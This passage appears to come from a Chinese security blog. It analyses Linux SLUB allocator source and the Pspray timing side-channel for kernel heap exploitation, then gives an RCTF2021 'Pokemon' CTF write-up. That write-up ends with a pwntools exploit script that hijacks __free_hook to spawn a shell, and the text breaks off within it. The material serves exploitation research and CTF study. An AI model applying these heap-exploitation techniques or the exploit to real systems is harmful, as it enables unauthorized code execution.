&lt;&lt; order);\t&#125;\tptr = kasan_kmalloc_large(ptr, size, flags);\t/* As ptr might get tagged, call kmemleak hook after KASAN. */\tkmemleak_alloc(ptr, size, 1, flags);\tkmsan_kmalloc_large(ptr, size, flags);\treturn ptr;&#125;void *kmalloc_large(size_t size, gfp_t flags)&#123;\tvoid *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);\ttrace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),\t\t      flags, NUMA_NO_NODE);\treturn ret;&#125;EXPORT_SYMBOL(kmalloc_large);\n\n这里kmalloc_large最终会调用的是__kmalloc_large_node函数进行分配，可以看到其直接调用了alloc_pages_node向buddy system请求内存了。\nstatic __always_inline unsigned int __kmalloc_index(size_t size,\t\t\t\t\t\t    bool size_is_constant)&#123;\tif (!size)\t\treturn 0;\tif (size &lt;= KMALLOC_MIN_SIZE)\t\treturn KMALLOC_SHIFT_LOW;\tif (KMALLOC_MIN_SIZE &lt;= 32 &amp;&amp; size &gt; 64 &amp;&amp; size &lt;= 96)\t\treturn 1;\tif (KMALLOC_MIN_SIZE &lt;= 64 &amp;&amp; size &gt; 128 &amp;&amp; size &lt;= 192)\t\treturn 2;\tif (size &lt;=          8) return 3;\tif (size &lt;=         16) return 4;\tif (size &lt;=         32) return 5;\tif (size &lt;=         64) return 6;\tif (size &lt;=        128) return 7;\tif (size &lt;=        256) return 8;\tif (size &lt;=        512) return 9;\tif (size &lt;=       1024) return 10;\tif (size &lt;=   2 * 1024) return 11;\tif (size &lt;=   4 * 1024) return 12;\tif (size &lt;=   8 * 1024) return 13;\tif (size &lt;=  16 * 1024) return 14;\tif (size &lt;=  32 * 1024) return 15;\tif (size &lt;=  64 * 1024) return 16;\tif (size &lt;= 128 * 1024) return 17;\tif (size &lt;= 256 * 1024) return 18;\tif (size &lt;= 512 * 1024) return 19;\tif (size &lt;= 1024 * 1024) return 20;\tif (size &lt;=  2 * 1024 * 1024) return 21;\tif (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)\t\tBUILD_BUG_ON_MSG(1, &quot;unexpected size in kmalloc_index()&quot;);\telse\t\tBUG();\t/* Will never be reached. Needed because the compiler may complain */\treturn -1;&#125;#define kmalloc_index(s) __kmalloc_index(s, true)\n\n而kmalloc_index函数其实就是调用__kmalloc_index，其内部实现也是比较简单粗暴。\n关于kmalloc_type函数在 CVE-2022-0185复现 文章中详细分析过了。\nvoid *__kmem_cache_alloc_node(struct kmem_cache *s, gfp_t gfpflags,\t\t\t      int node, size_t orig_size,\t\t\t      unsigned long caller)&#123;\treturn slab_alloc_node(s, NULL, gfpflags, node,\t\t\t       caller, orig_size);&#125;void *kmalloc_trace(struct kmem_cache *s, gfp_t gfpflags, size_t size)&#123;\tvoid *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,\t\t\t\t\t    size, _RET_IP_);\ttrace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);\tret = kasan_kmalloc(s, ret, size, gfpflags);\treturn ret;&#125;EXPORT_SYMBOL(kmalloc_trace);\n\nkmalloc_trace就是对__kmem_cache_alloc_node函数的调用，而__kmem_cache_alloc_node其实就是对slab_alloc_node的wrapper，前面也已经分析过slab_alloc_node了，不过需要注意的是这里指定了node为NUMA_NO_NODE。\nvoid *__kmalloc(size_t size, gfp_t flags)&#123;\treturn __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);&#125;EXPORT_SYMBOL(__kmalloc);\n\n这里__kmalloc也是直接调用了__do_kmalloc_node函数。\nstatic __always_inlinevoid *__do_kmalloc_node(size_t size, gfp_t flags, int node, unsigned long caller)&#123;\tstruct kmem_cache *s;\tvoid *ret;\tif (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;\t\tret = __kmalloc_large_node(size, flags, node);\t\ttrace_kmalloc(caller, ret, size,\t\t\t      PAGE_SIZE &lt;&lt; get_order(size), flags, node);\t\treturn ret;\t&#125;\ts = kmalloc_slab(size, flags, caller);\tif (unlikely(ZERO_OR_NULL_PTR(s)))\t\treturn s;\tret = __kmem_cache_alloc_node(s, flags, node, size, caller);\tret = kasan_kmalloc(s, ret, size, flags);\ttrace_kmalloc(caller, ret, size, s-&gt;size, flags, node);\treturn ret;&#125;\n\n这里的逻辑在开头位置同上，如果size大于KMALLOC_MAX_CACHE_SIZE那么就直接调用__kmalloc_large_node进行分配。如果小于的话则贤调用kmalloc_slab寻找到对应的kmem_cache然后调用__kmem_cache_alloc_node进行分配。\nstruct kmem_cache *kmalloc_slab(size_t size, gfp_t flags, unsigned long caller)&#123;\tunsigned int index;\tif (size &lt;= 192) &#123;\t\tif (!size)\t\t\treturn ZERO_SIZE_PTR;\t\tindex = size_index[size_index_elem(size)];\t&#125; else &#123;\t\tif (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))\t\t\treturn NULL;\t\tindex = fls(size - 1);\t&#125;\treturn kmalloc_caches[kmalloc_type(flags, caller)][index];&#125;\n\n这里寻找的方式也和前面的十分相似，size_index和size_index_elem的实现也是比较粗暴。\nstatic u8 size_index[24] __ro_after_init = &#123;\t3,\t/* 8 */\t4,\t/* 16 */\t5,\t/* 24 */\t5,\t/* 32 */\t6,\t/* 40 */\t6,\t/* 48 */\t6,\t/* 56 */\t6,\t/* 64 */\t1,\t/* 72 */\t1,\t/* 80 */\t1,\t/* 88 */\t1,\t/* 96 */\t7,\t/* 104 */\t7,\t/* 112 */\t7,\t/* 120 */\t7,\t/* 128 */\t2,\t/* 136 */\t2,\t/* 144 */\t2,\t/* 152 */\t2,\t/* 160 */\t2,\t/* 168 */\t2,\t/* 176 */\t2,\t/* 184 */\t2\t/* 192 */&#125;;static inline unsigned int size_index_elem(unsigned int bytes)&#123;\treturn (bytes - 1) / 8;&#125;\n\n对象的释放do_slab_freestatic __always_inline void do_slab_free(struct kmem_cache *s,\t\t\t\tstruct slab *slab, void *head, void *tail,\t\t\t\tint cnt, unsigned long addr)&#123;\tvoid *tail_obj = tail ? : head;\tstruct kmem_cache_cpu *c;\tunsigned long tid;\tvoid **freelist;redo:\t/*\t * Determine the currently cpus per cpu slab.\t * The cpu may change afterward. However that does not matter since\t * data is retrieved via this pointer. If we are on the same cpu\t * during the cmpxchg then the free will succeed.\t */\tc = raw_cpu_ptr(s-&gt;cpu_slab);\ttid = READ_ONCE(c-&gt;tid);\t/* Same with comment on barrier() in slab_alloc_node() */\tbarrier();\tif (unlikely(slab != c-&gt;slab)) &#123;\t\t__slab_free(s, slab, head, tail_obj, cnt, addr);\t\treturn;\t&#125;\tif (USE_LOCKLESS_FAST_PATH()) &#123;\t\tfreelist = READ_ONCE(c-&gt;freelist);\t\tset_freepointer(s, tail_obj, freelist);\t\tif (unlikely(!__update_cpu_freelist_fast(s, freelist, head, tid))) &#123;\t\t\tnote_cmpxchg_failure(&quot;slab_free&quot;, s, tid);\t\t\tgoto redo;\t\t&#125;\t&#125; else &#123;\t\t/* Update the free list under the local lock */\t\tlocal_lock(&amp;s-&gt;cpu_slab-&gt;lock);\t\tc = this_cpu_ptr(s-&gt;cpu_slab);\t\tif (unlikely(slab != c-&gt;slab)) &#123;\t\t\tlocal_unlock(&amp;s-&gt;cpu_slab-&gt;lock);\t\t\tgoto redo;\t\t&#125;\t\ttid = c-&gt;tid;\t\tfreelist = c-&gt;freelist;\t\tset_freepointer(s, tail_obj, freelist);\t\tc-&gt;freelist = head;\t\tc-&gt;tid = next_tid(tid);\t\tlocal_unlock(&amp;s-&gt;cpu_slab-&gt;lock);\t&#125;\tstat(s, FREE_FASTPATH);&#125;\n\n这里依旧分为两条路径，首先会比较待释放的对象所属于的slab是否是percpu slab，如果是则直接挂回去即可，遵循LIFO机制。\n如果不是则会进入到__slab_free函数中进行处理。\nstatic void __slab_free(struct kmem_cache *s, struct slab *slab,\t\t\tvoid *head, void *tail, int cnt,\t\t\tunsigned long addr)&#123;\tvoid *prior;\tint was_frozen;\tstruct slab new;\tunsigned long counters;\tstruct kmem_cache_node *n = NULL;\tunsigned long flags;\tstat(s, FREE_SLOWPATH);\tif (kfence_free(head))\t\treturn;\tif (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;\t\tfree_to_partial_list(s, slab, head, tail, cnt, addr);\t\treturn;\t&#125;\tdo &#123;\t\tif (unlikely(n)) &#123;\t\t\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\t\t\tn = NULL;\t\t&#125;\t\tprior = slab-&gt;freelist;\t\tcounters = slab-&gt;counters;\t\tset_freepointer(s, tail, prior);\t\tnew.counters = counters;\t\twas_frozen = new.frozen;\t\tnew.inuse -= cnt;\t\tif ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;\t\t\tif (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;\t\t\t\t/*\t\t\t\t * Slab was on no list before and will be\t\t\t\t * partially empty\t\t\t\t * We can defer the list move and instead\t\t\t\t * freeze it.\t\t\t\t */\t\t\t\tnew.frozen = 1;\t\t\t&#125; else &#123; /* Needs to be taken off a list */\t\t\t\tn = get_node(s, slab_nid(slab));\t\t\t\t/*\t\t\t\t * Speculatively acquire the list_lock.\t\t\t\t * If the cmpxchg does not succeed then we may\t\t\t\t * drop the list_lock without any processing.\t\t\t\t *\t\t\t\t * Otherwise the list_lock will synchronize with\t\t\t\t * other processors updating the list of slabs.\t\t\t\t */\t\t\t\tspin_lock_irqsave(&amp;n-&gt;list_lock, flags);\t\t\t&#125;\t\t&#125;\t&#125; while (!slab_update_freelist(s, slab,\t\tprior, counters,\t\thead, new.counters,\t\t&quot;__slab_free&quot;));\tif (likely(!n)) &#123;\t\tif (likely(was_frozen)) &#123;\t\t\t/*\t\t\t * The list lock was not taken therefore no list\t\t\t * activity can be necessary.\t\t\t */\t\t\tstat(s, FREE_FROZEN);\t\t&#125; else if (new.frozen) &#123;\t\t\t/*\t\t\t * If we just froze the slab then put it onto the\t\t\t * per cpu partial list.\t\t\t */\t\t\tput_cpu_partial(s, slab, 1);\t\t\tstat(s, CPU_PARTIAL_FREE);\t\t&#125;\t\treturn;\t&#125;\tif (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))\t\tgoto slab_empty;\t/*\t * Objects left in the slab. If it was not on the partial list before\t * then add it.\t */\tif (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;\t\tremove_full(s, n, slab);\t\tadd_partial(n, slab, DEACTIVATE_TO_TAIL);\t\tstat(s, FREE_ADD_PARTIAL);\t&#125;\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\treturn;slab_empty:\tif (prior) &#123;\t\t/*\t\t * Slab on the partial list.\t\t */\t\tremove_partial(n, slab);\t\tstat(s, FREE_REMOVE_PARTIAL);\t&#125; else &#123;\t\t/* Slab must be on the full list */\t\tremove_full(s, n, slab);\t&#125;\tspin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\tstat(s, FREE_SLAB);\tdiscard_slab(s, slab);&#125;\n\n首先还是kfence和kmem_cache_debug相关，如果设置了SLAB_DEBUG_FLAGS则直接调用free_to_partial_list函数后返回即可。\n随后进入循环，这里首先将待释放freelist所属于的slab的freelist写到带释放freelist对应的位置，这里new是栈上的临时slab结构体。\n然后进行判断，slab的所有对象都未被使用或者slab上没有空闲的对象并且slab未被冻结，则会进入分支中。进入分支之后继续判断，首先查看是否有percpu partial slab并且slab上没有空闲的对象，如果成立则让该slab冻结，如果不是则获取slab所对应的kmem_cahce_node。\n结束循环后，会判断是否找到kmem_cache_node，如果没有找到则进入分支中，如果slab已被冻结，则什么都不敢，若需要被冻结则调用put_cpu_partial函数直接将slab放入到percpu partial链表中，完成释放工作。\n接下来会判断，slab的被使用的对象的数量是否为0并且n-&gt;nr_partial == s-&gt;min_partial的话就代表该slab的所有的对象都被释放掉了并且node上的partial slab数量已经超过min_partial了，这时会跳入slab_empty标签中。在slab_empty标签的逻辑比较简单，判断当前slab原先是否有空闲对象，然后选择从对应的地方移除，最后调用discard_slab函数，释放该slab到内存中。\n如果不满足会做一些检查，并且如果以前该slab位于full也将被移到partial中。\nkfree上面是释放对象的核心函数逻辑，下面一样提一下上层函数。\nvoid kfree(const void *object)&#123;\tstruct folio *folio;\tstruct slab *slab;\tstruct kmem_cache *s;\ttrace_kfree(_RET_IP_, object);\tif (unlikely(ZERO_OR_NULL_PTR(object)))\t\treturn;\tfolio = virt_to_folio(object);\tif (unlikely(!folio_test_slab(folio))) &#123;\t\tfree_large_kmalloc(folio, (void *)object);\t\treturn;\t&#125;\tslab = folio_slab(folio);\ts = slab-&gt;slab_cache;\t__kmem_cache_free(s, (void *)object, _RET_IP_);&#125;EXPORT_SYMBOL(kfree);\n\n这里出现了一个遗忘不熟悉的结构体folio，这里简单提一下，其表示的是一块物理，虚拟，逻辑上都是连续的内存，其本质是复用page结构体然后将其转化为了folio结构体。\n可以看到函数最先使用virt_to_folio函数得到了folio结构体\nstatic inline struct folio *virt_to_folio(const void *x)&#123;\tstruct page *page = virt_to_page(x);\treturn page_folio(page);&#125;\n\n这里首先调用virt_to_page函数从虚拟地址找到其页面，随后调用page_folio函数从页面获得folio结构体。\n然后根据名字就能看出来free_large_kmalloc主要用于free大的对象，而大的对象是以复合页的形式存在的，所以如果是复合页则会进入到if分支中，如果不是则进入到下面的内容。\nvoid free_large_kmalloc(struct folio *folio, void *object)&#123;\tunsigned int order = folio_order(folio);\tif (WARN_ON_ONCE(order == 0))\t\tpr_warn_once(&quot;object pointer: 0x%p\\n&quot;, object);\tkmemleak_free(object);\tkasan_kfree_large(object);\tkmsan_kfree_large(object);\tmod_lruvec_page_state(folio_page(folio, 0), NR_SLAB_UNRECLAIMABLE_B,\t\t\t      -(PAGE_SIZE &lt;&lt; order));\t__free_pages(folio_page(folio, 0), order);&#125;\n\n可以看到这个函数在最后直接调用了__free_pages将对象返回给了buddy system。\nvoid __kmem_cache_free(struct kmem_cache *s, void *x, unsigned long caller)&#123;\tslab_free(s, virt_to_slab(x), x, NULL, &amp;x, 1, caller);&#125;\n\n而面对普通的对象释放是调用的__kmem_cache_free函数其内部其实就是调用了slab_free函数。\nstatic __fastpath_inline void slab_free(struct kmem_cache *s, struct slab *slab,\t\t\t\t      void *head, void *tail, void **p, int cnt,\t\t\t\t      unsigned long addr)&#123;\tmemcg_slab_free_hook(s, slab, p, cnt);\t/*\t * With KASAN enabled slab_free_freelist_hook modifies the freelist\t * to remove objects, whose reuse must be delayed.\t */\tif (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))\t\tdo_slab_free(s, slab, head, tail, cnt, addr);&#125;\n\nslab_free函数内部最终也会调用到前面分析了do_slab_free函数。\nPspray简单介绍在前面分析slab_alloc_node的函数中发现了存在了两条路，两条路的名字分别为fast path和slow path，而这一利用手法就是基于上述的代码完成的，这是一项基于时序侧信道的漏洞利用技术，通过此方法可以大幅度提高内核漏洞利用成功率。\n众所周知，在内核中有很多 动物朋友 保护机制，比如CFI，KASLR等诸多保护，使得攻击者十分难以完成利用。而且现如今的内核加入了shadow stack并且近期爆出的诸多漏洞也都和堆相关，所以内核的堆利用一直都是内核漏洞的主流门派。但是玩过堆的应该都知道内核存在一种机制是slab freelist随机化，让攻击者无法预测到即将申请的堆块在何处，这也就使得更加难以利用了。\n而今天给大家介绍的一种利用手法Pspray可以用来很好的对抗slab freelist的随机化。\n现状分析\n上图十分简单明了的给出了分配一个对象的流程。\n\n  如果在cpu freelist中有则直接取，如果没有进入下一阶段\n  这里从cpu page freelist中取，操作主要是用cpu page freelist给到cpu freelist，即freelist的初始化\n  这里从cpu partial list中取\n  这里从node partial list中取\n  全都没了就向buddy system申请\n\n然后就是Slab Freelist Random机制，当开启CONFIG_SLAB_FREELIST_RANDOM选项时会开启保护，主要形式如下图所示\n\nOut Of Bounds在堆利用中时常会遇到堆溢出的漏洞，一般来说我们都期望能够实现下图这样堆的形式\n\n但是事与愿违，因为地址随机化的存在大概率会成为下图这样\n\n中间可能隔着其他结构体，一类的情况。\n在开启 freelist 随机化之后的漏洞利用成功率如下，基于 Linux kernel 使用 Fisher-Yates shuffle 算法来进行随机化这个前提计算的，其中N为一张 slub 上的总对象数，同时我们假设在同一张 slab 上分配了 1 个漏洞对象与k个 victim 对象：\n\n（不会写数学公式）\n总体而言，我们从N个空闲对象中选择k个 victim 对象 与 1 个漏洞对象，在进行利用时 victim 对象与漏洞对象必须相邻，因此我们从N−1 个对象中取出k个对象（还有一个作为漏洞对象），喷射的 victim 对象数量可以从 0 到 N−1 ，因此对于带有 random slab freelist 的 OOB 利用而言的成功率计算如下：\n\nUse After Free\nUAF 漏洞的利用通常是要将漏洞对象与 victim 对象放在同一内存地址，上图展示了对 CVE-2019-2215 的利用过程，首先用 epoll_ctl() 分配漏洞对象，接下来用 ioctl() 释放漏洞对象，随后用 msgsnd() 取回刚刚释放的对象，最后再用 close() 将该对象释放\n\n上图主要展示了UAF的失败案例，UAF的成功率如下\n\n上式中A表示的分配的对象数量，N表示一张slab拥有的对象数量。漏洞利用失败的主要原因是对 slab 信息的缺失，本文找到了一种能够获取 slab 的部分分配信息的时序侧信道方法，从而提高利用成功概率。\n利用原理分析如前面的一张图所示，SLUB 有五条不同深度的分配路径以优化性能表现，为了弄清不同路径的表现，作者通过 msgsnd() 系统调用测试了从 kmalloc() 的核心函数 slab_alloc_node() 的开始到结尾的性能，经过多轮测试发现 slow-path 与其他路径相比存在明显的表现差距，因此攻击者可以通过测量分配时间得知内存分配所经历的路径。\nslow-path 以外的分配路径的分配状态都是难以确定的，但 slow-path 的行为与其他路径不同，此时内核会从buddy system分配一张新 slab，由此我们可以知道当前的 slab 刚被分配且仅分配了一个对象\n为了能够使用时序侧信道攻击，需要找到满足这样三个条件的系统调用，首先是普通用户可以使用，其次只分配一个对象，最后除了分配对象外性能开销较小。\n\n这里原作者找到了满足上面三个条件并且从涵盖kmalloc-32到kmalloc-8192的系统调用。\n\n这里使用msgsnd系统调用测试得到了如上图所示的结果，可以知道的事fast path和medium path一般来说较为难以区分，但是在slow path时会有很明显的时间差。\n\n上图展示了利用Pspray的流程：\n\n  首先使用Pspray确定了slow path被执行，此时意味着当前的cpu slab是新向buddy system申请的slab\n  接下来堆喷N-1个对象使其完全被分配\n  此时如果再次申请一个对象则又回进入到slow path中，并且是一个全部为空的slab\n  不难想到的是如果我们的Vuln object不在高地址那么就一定可以完成漏洞利用\n\n此时利用的成功率为\n\n\n后面的UAF的流程和上述类似，并且其成功率为\n\n实际测试#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdint.h&gt;#include &lt;sched.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/ipc.h&gt;struct list_head&#123;    uint64_t next;    uint64_t prev;&#125;;struct msg_msg&#123;    struct list_head m_list;    uint64_t m_type;    uint64_t m_ts;    uint64_t next;    uint64_t security;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;void bind_cpu(int core)&#123;    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(core, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);&#125;uint64_t rdtsc(void)&#123;    __asm__(        &quot;rdtsc;&quot;        &quot;shl rdx,32;&quot;        &quot;add rax,rdx;&quot;        &quot;leave;&quot;        &quot;ret;&quot;);&#125;int main(int argc, char **argv, char **envp)&#123;    int msqid[0x1000];    uint64_t exec_time[0x1000];    char buf[0x1000];    struct msqid_ds ds_buf;    bind_cpu(0);    for (int i = 0; i &lt; 0x1000; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)        &#123;            printf(&quot;[x] FAILD to get %d msg_queue!\\n&quot;, i);            perror(&quot;FAILED to get msg_queue&quot;);            exit(EXIT_FAILURE);        &#125;    &#125;    *(size_t *)buf = 123456;    ((struct msgbuf *)buf)-&gt;mtype = 0xdeadbeef;    for (int i = 0; i &lt; 0x1000; i++)    &#123;        uint64_t begin, end;        begin = rdtsc();        if (msgsnd(msqid[i], &amp;buf, 512 - sizeof(struct msg_msg), 0) &lt; 0)        &#123;            printf(&quot;[x] FAILD to send %d msg!\\n&quot;, i);            perror(&quot;FAILED to alloc msg_msg&quot;);            exit(EXIT_FAILURE);        &#125;        end = rdtsc();        exec_time[i] = end - begin;    &#125;    for (int i = 0; i &lt; 0x1000; i++)    &#123;        if (msgrcv(msqid[i], buf, 512 - sizeof(struct msg_msg), 0xdeadbeef, 0) &lt; 0)        &#123;            printf(&quot;[x] FAILD to read %d msg!\\n&quot;, i);            perror(&quot;FAILED to free msg_msg&quot;);            exit(EXIT_FAILURE);        &#125;    &#125;    for (int i = 0; i &lt; 0x1000; i++)    &#123;        if (msgctl(msqid[i], IPC_RMID, &amp;ds_buf) &lt; 0)        &#123;            printf(&quot;[x] FAILD to delete %d msg_queue!\\n&quot;, i);            perror(&quot;FAILED to free msg_queue&quot;);            exit(EXIT_FAILURE);        &#125;    &#125;    for (int i = 0; i &lt; 0x1000; i++)    &#123;        printf(&quot;[*] Execute time for no.%d msgsnd(): %ld\\n&quot;, i, exec_time[i]);    &#125;    return 0;&#125;\n\n这里使用ctf题目进行了测试一下，发现还是存在非常明显的时间差的。\n\n总的来说，利用方法还是比较简单的，想必看完了大家也应该都明白了如何利用此手法。\n\n参考链接：\n​    https://arttnba3.cn/2023/09/16/PAPER-0X03-PSPRAY/\n​    https://www.usenix.org/system/files/usenixsecurity23-lee-yoochan.pdf\n","categories":["Linux Kernel"],"tags":["堆喷射","侧信道攻击","slab源码分析"]},{"title":"RCTF2021复现","url":"/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/","content":"以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己的逆向能力。\nPokemon流程分析main函数存在三个选项，第一就是创建chunk，创建的方式分为三种\nstruct chunk(Gold 3)0x1D0:&#123;\t888~908\t400~420&#125;struct chunk(Silver 2)0x210:&#123;\t666~676\t200~210&#125;struct chunk(Bronze 1)0x7f~0x380:&#123;\t23~23+(size/16)\tchunk_addr\tpasswd&#125;\n\n这是我推测出来的三个结构体。\n第二个选项就是对chunk进行一些行为，又分为三个，第一是释放chunk但是只允许类型为1的chunk被释放，第二个是show但是有一定的限制\nif ( memchr((a1 + 16), 0x7F, 8uLL)    || memchr((a1 + 16), 0x7E, 8uLL)    || strchr((a1 + 16), 0x55)    || strchr((a1 + 16), 0x56) )\n\n第三个选项就是修改内容，但是只可以修改一次并且类型1不能修改，类型2每个0x10才能修改，但是存在堆溢出，类型3可以修改0x10之后的内容大小为0x20\n然后就是main当中的第三个选项，这里首先就是比较你的两个chunk的值与Mewtwo作比较\nstruct Mewtwo:&#123;\t99999999\t6666666&#125;\n\n如果小于则会直接推出，如果大于就会进入下面\n__int64 __fastcall sub_3892(__int64 a1)&#123;  int i; // [rsp+14h] [rbp-Ch]  for ( i = 0; ; ++i )  &#123;    if ( i &gt; 1 )      return 0LL;    if ( *(a1 + 4 * (i + 16LL) + 8) == 1 &amp;&amp; *(*(a1 + 8 * (i + 6LL) + 8) + 0x10LL) )      break;  &#125;  if ( !dword_81F8 )  &#123;    printf(&quot;Please remember the password of the evolutionary gem: &quot;);    write(1, (*(a1 + 8 * (i + 6LL) + 8) + 0x10LL), 8uLL);    write(1, &quot;\\n&quot;, 1uLL);    dword_81F8 = 1;  &#125;  return 1LL;&#125;\n\n没有限制条件的write\nssize_t __fastcall sub_396E(__int64 a1)&#123;  ssize_t result; // rax  int i; // [rsp+10h] [rbp-10h]  int j; // [rsp+14h] [rbp-Ch]  for ( i = 0; i &lt;= 1; ++i )  &#123;    result = *(a1 + 4 * (i + 16LL) + 8);    if ( result == 1 )    &#123;      result = *(*(a1 + 8 * (i + 6LL) + 8) + 16LL);      if ( result )      &#123;        printf(&quot;Please give the evolution password: &quot;);        result = read(0, *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL), 0x30uLL);        for ( j = 0; j &lt;= 0x2F; ++j )        &#123;          result = *(*(a1 + 8 * (i + 6LL) + 8) + 0x18LL) + j;          *result ^= *(*(a1 + 8 * (i + 6LL) + 8) + j % 8 + 0x10LL);        &#125;        return result;      &#125;    &#125;  &#125;  return result;&#125;\n\n以及一个写入，这个写入是往chunk的0x18上的地址的值来写入。\n然后这里的free是存在一个小东西，就是如果chunk的0x10位置和0x18位置存在值就会free掉0x18位置的值。\n然后这里把游戏角色的结构体贴出来\nstruct role:&#123;\t\tname;0x20\t*(chunk+8)+=1000;0x28\t*(chunk)+=0;0x30\tremaining=1666;0x34\tcount;0x38\tchunk;0x48\texists/category;&#125;\n\n利用分析其实这道题就算是逆向完了也有点儿难想到利用方式，这里很烦的一点就是我们可以控制的内容太少了，但是由于题目给的read的地方都不能修改掉fd和bk那就肯定是存在overlapping，加上存在堆溢出可以很容易想到改变堆的大小，形成UAF。\n然后这里需要注意的一点就是当malloc的size大于small bin中的size且小于small bin当中的size+0x10就不会进行切块\n但是我觉得这应该不只是small bin当中的机制(我看源码只看了small bin的request所以其他的我也不确定)，后面有时间会试试在unsorted bin和large bin中是否成立。\n其实知道了这个知识点就很好利用了，因为如果按照固定思维的我们堆溢出无法修改掉size位，但是如果存在以上机制我们即可利用0x220来修改掉后面chunk的size了。\n综上，expfrom pwn import *r = process(&#x27;./Pokemon&#x27;)elf = ELF(&#x27;./Pokemon&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(category, size=0, idx=0):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(bytes(str(category), encoding=&#x27;utf8&#x27;))    if category == 1:        r.recvuntil(b&#x27;You will get a Pikachu. How big do you want it to be?&#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def delete(idx, need=False):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;1&#x27;)    if need:        r.recvuntil(            b&#x27;This Pokemon is very valuable. Are you sure you want to release it? [Y/N]&#x27;        )        r.sendline(b&#x27;Y&#x27;)def edit(idx, content):    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;]&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Choice:&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;You say: &#x27;)    r.send(content)def xor(payload, key):    res = &#x27;&#x27;    for i in range(len(payload)):        res += chr(payload[i] ^ key[i % 8])        print(hex(ord(res[len(res) - 1])))    return bytes(res, encoding=&#x27;ISO-8859-1&#x27;)r.recvuntil(b&#x27;Welcome to the Pokemon world, input your name: &#x27;)r.sendline(b&#x27;196082&#x27;)for i in range(7):    create(1, 0x220)    delete(0)    create(1, 0x300)    delete(0)    create(1, 0x310)    delete(0)create(1, 0x220)create(1, 0x300, 1)delete(0)create(1, 0x300)create(1, 0x300)create(1, 0x300)create(1, 0x300)delete(0)create(2)edit(0, p64(0xdeadbeef) * 16 * 2 + p64(0) + p64(0xc40 + 1))delete(1)delete(0, True)create(1, 0x300)create(1, 0x300, 1)delete(1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;]&#x27;)r.sendline(b&#x27;1&#x27;)create(1, 0x310, 1)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;gem: &#x27;)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;N&#x27;)malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]delete(1)create(1, 0x300, 0)create(3, idx=1)edit(1,     p8(0xaa) * 8 + p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;] - 8) + b&#x27;\\n&#x27;)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;3&#x27;)r.recvuntil(b&#x27;[Y/N]&#x27;)r.sendline(b&#x27;Y&#x27;)r.recvuntil(b&#x27;Please give the evolution password: &#x27;)print(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]))r.send(    xor(b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.symbols[&#x27;system&#x27;]),        p8(0xaa) * 8))delete(0)# 